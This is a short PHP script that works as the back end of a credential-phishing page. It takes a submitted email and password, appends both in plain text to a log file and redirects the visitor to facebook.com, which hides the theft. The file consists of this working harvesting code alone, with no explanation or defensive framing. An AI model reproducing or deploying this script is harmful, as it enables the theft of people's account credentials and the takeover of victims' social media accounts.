<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $pass = $_POST['pass'];
    $file = fopen("log.txt", "a");
    fwrite($file, "Email: " . $email . " | Password: " . $pass . "\n");
    fclose($file);
    header("Location: https://facebook.com");
    exit();
} else {
    echo "Invalid Request";
}
?>
c
